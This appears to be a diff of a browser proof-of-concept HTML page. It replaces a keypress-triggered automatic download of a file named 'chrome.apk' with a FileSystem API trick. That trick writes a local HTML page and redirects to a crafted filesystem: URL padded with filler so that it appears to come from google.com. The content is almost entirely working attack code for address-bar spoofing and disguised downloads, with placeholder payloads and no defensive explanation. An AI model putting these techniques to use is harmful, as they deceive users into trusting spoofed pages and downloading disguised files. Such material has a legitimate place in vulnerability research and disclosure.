@@ -1,40 +1,37 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
+<script>
+
+</script>
 </head>
 <body>
-  <center><h2>POC by Chigorin!</h2></center>
 
-  <script>
-    // Listen to any keydown
-    window.addEventListener('keydown', function(e) {
-      // open the download
-      openWin();
-      // request fullscreen
-      //goFullScreen();
-    });
+<script>
+window.requestFileSystem  = window.requestFileSystem || window.webkitRequestFileSystem;
+function onInitFs(fs) {
+  fs.root.getFile("qq.html", {create: true}, fileEntry => {
 
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
+    fileEntry.createWriter(fileWriter=>{
+      
+      var blob = new Blob(["<b>Not google</b>"], {type : 'text/html'});
+      fileWriter.write(blob);
+    }, errorHandler);
+    
+  var url= fileEntry.toURL();
+  console.dir(url);
+  location="filesystem:http://filesystem.google.com:80&login&SGVsbG9UaGlzSXNKdXN0QUZpbGxlcklhbVNvcnJ5VG9EaXNzYXBwb2ludEJ1dEZlZWxGcmVlVG9JZ25vcmVUaGlzLUFsc28tSWFtTG9va2luZ0ZvcndhcmRUb1dlc3RXb3JsZA&login=0&secure=true&FILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLERFILLER=123456@"+url.split("filesystem:http://")[1]
+  }, errorHandler);
 
-    // Kick off your “APK” download
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "chrome.apk"
-      );
-    }
+}
 
-  </script>
+function errorHandler(e) {
+  console.dir(e);
+}
+
+window.requestFileSystem(window.TEMPORARY, 1024, onInitFs, errorHandler);
+</script>
+</body>
+</html>
   
 
   
